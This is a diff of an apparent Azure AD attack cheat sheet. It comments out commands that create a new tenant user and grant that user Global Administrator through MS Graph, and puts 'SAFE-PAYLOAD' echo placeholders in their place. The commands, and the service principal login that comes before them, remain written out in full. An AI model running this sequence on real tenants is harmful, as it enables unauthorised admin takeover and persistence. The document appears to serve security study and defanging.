@@ -282,11 +282,13 @@ az ad sp credential list --id <app_id>
 az login --service-principal -u "app id" -p "password" --tenant <tenant ID> --allow-no-subscriptions
 
 # Create new user in tenant
-az ad user create --display-name <name> --password <password> --user-principal-name <upn>
+# [SAFE-PAYLOAD] echo "Simulating creation of new user..."
+# az ad user create --display-name <name> --password <password> --user-principal-name <upn>
 
 # Add user to Global Admin via MS Graph
 $Body="{'principalId':'User Object ID', 'roleDefinitionId': '62e90394-69f5-4237-9190-012177145e10', 'directoryScopeId': '/'}"
-az rest --method POST --uri https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments --headers "Content-Type=application/json" --body $Body
+# [SAFE-PAYLOAD] echo "Simulating role assignment to Global Admin..."
+# az rest --method POST --uri https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments --headers "Content-Type=application/json" --body $Body
 ```
 
 ## Additional Tools Reference
